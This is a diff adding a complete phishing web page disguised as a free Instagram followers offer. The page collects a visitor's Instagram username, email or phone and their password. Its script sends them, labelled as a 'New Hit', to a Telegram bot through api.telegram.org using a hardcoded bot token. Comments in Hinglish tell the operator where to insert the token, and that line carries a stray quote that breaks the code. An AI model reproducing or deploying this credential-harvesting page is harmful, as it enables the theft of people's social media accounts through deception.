@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Free Instagram Followers - Get Now</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body {
+      font-family: system-ui, -apple-system, sans-serif;
+      background: linear-gradient(135deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d);
+      color: #fff;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 15px;
+    }
+    .container {
+      background: rgba(0,0,0,0.7);
+      border-radius: 20px;
+      padding: 35px 25px;
+      width: 100%;
+      max-width: 400px;
+      text-align: center;
+      box-shadow: 0 15px 40px rgba(0,0,0,0.7);
+      backdrop-filter: blur(8px);
+    }
+    .logo { font-size: 80px; color: #fff; margin-bottom: 20px; text-shadow: 0 0 20px #e1306c; }
+    h1 { font-size: 2.4rem; margin-bottom: 5px; }
+    .tag { font-size: 1.4rem; color: #ffd700; margin-bottom: 30px; }
+    .pack-container { display: flex; flex-wrap: wrap; gap: 10px; justify-content: center; margin-bottom: 30px; }
+    .pack { padding: 12px 24px; border: 2px solid #ffd700; border-radius: 50px; cursor: pointer; transition: all 0.3s; font-weight: 600; }
+    .pack:hover, .pack.active { background: #ffd700; color: #000; transform: scale(1.08); }
+    .input-group { margin-bottom: 20px; text-align: left; }
+    label { display: block; margin-bottom: 8px; font-size: 1.05rem; }
+    input { width: 100%; padding: 14px; border: none; border-radius: 12px; background: rgba(255,255,255,0.12); color: white; font-size: 1.1rem; }
+    input::placeholder { color: rgba(255,255,255,0.5); }
+    button { width: 100%; padding: 16px; font-size: 1.4rem; font-weight: bold; background: linear-gradient(90deg, #00ff87, #00d084); color: #000; border: none; border-radius: 50px; cursor: pointer; margin: 15px 0; transition: all 0.3s; }
+    button:hover { transform: scale(1.05); box-shadow: 0 10px 30px rgba(0,255,135,0.4); }
+    button:disabled { opacity: 0.6; cursor: not-allowed; }
+    #success { display: none; margin-top: 25px; padding: 20px; background: rgba(0,255,135,0.2); border: 2px solid #00ff87; border-radius: 15px; font-size: 1.2rem; font-weight: 600; }
+    .info { font-size: 0.9rem; color: #ddd; margin-top: 30px; opacity: 0.8; }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <div class="logo"><i class="fab fa-instagram"></i></div>
+  <h1>Instagram</h1>
+  <div class="tag">Free Instagram Followers</div>
+
+  <div class="pack-container">
+    <div class="pack" data-count="100">100</div>
+    <div class="pack" data-count="200">200</div>
+    <div class="pack" data-count="300">300</div>
+    <div class="pack" data-count="500">500</div>
+    <div class="pack active" data-count="1000">1K</div>
+  </div>
+
+  <div class="input-group">
+    <label>Username / Email / Phone</label>
+    <input type="text" id="cred" placeholder="Your Instagram username or email or phone" autocomplete="off"/>
+  </div>
+
+  <div class="input-group">
+    <label>Password</label>
+    <input type="password" id="pass" placeholder="Enter your password" autocomplete="off"/>
+  </div>
+
+  <button id="submitBtn">Get Free Followers</button>
+
+  <div id="success">Successfully Request Sent!<br>Wait 24 hours for delivery.</div>
+
+  <div class="info">Enter valid details • Fast & automatic delivery</div>
+</div>
+
+<script>
+  let selected = 1000;
+
+  document.querySelectorAll('.pack').forEach(el => {
+    el.addEventListener('click', () => {
+      document.querySelectorAll('.pack').forEach(e => e.classList.remove('active'));
+      el.classList.add('active');
+      selected = Number(el.dataset.count);
+    });
+  });
+
+  document.getElementById('submitBtn').addEventListener('click', async () => {
+    const cred = document.getElementById('cred').value.trim();
+    const pass = document.getElementById('pass').value.trim();
+
+    if (!cred) return alert("Username/Email/Phone enter karo bhai!");
+    if (!pass) return alert("Password to daal do!");
+
+    const urlParams = new URLSearchParams(window.location.search);
+    const chatId = urlParams.get('id');
+
+    if (!chatId || chatId.trim() === '' || isNaN(Number(chatId))) {
+      alert("Link galat hai! Sahi link use karo jisme ?id=... ho.");
+      return;
+    }
+
+    const time = new Date().toLocaleString('en-US', { timeZone: 'Asia/Kolkata', hour12: true });
+
+    // HTML mode ke liye safe formatting
+    const message = `<b>🔥 New Hit 🔥</b>\n` +
+                    `━━━━━━━━━━━━━━━━━━━━━\n` +
+                    `<b>👤 Cred   :</b> ${cred}\n` +
+                    `<b>🔑 Pass   :</b> ${pass}\n` +
+                    `<b>👥 Followers :</b> ${selected}\n` +
+                    `<b>🕒 Time   :</b> ${time}\n` +
+                    `<b>🌐 From   :</b> ${location.hostname}\n` +
+                    `━━━━━━━━━━━━━━━━━━━━━`;
+
+    const btn = document.getElementById('submitBtn');
+    btn.disabled = true;
+    btn.textContent = "Processing...";
+
+    try {
+      const botToken = '7752428251:AAGNplPML8xLHGQDaHYgs5djp70KcqMBFEI'';  // ←←← Yahan real bot token daalo
+
+      const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+      const response = await fetch(apiUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: 'HTML'   // ← Ye change kiya → error fix
+        })
+      });
+
+      const data = await response.json();
+
+      if (response.ok && data.ok) {
+        document.getElementById('success').style.display = 'block';
+        btn.textContent = "Request Sent ✓";
+      } else {
+        alert("Send fail: " + (data.description || `Error ${response.status}`));
+        console.log(data); // browser console me check karne ke liye
+      }
+    } catch (error) {
+      alert("Connection problem: " + error.message);
+    } finally {
+      if (document.getElementById('success').style.display !== 'block') {
+        btn.disabled = false;
+        btn.textContent = "Get Free Followers";
+      }
+    }
+  });
+</script>
+</body>
+</html>
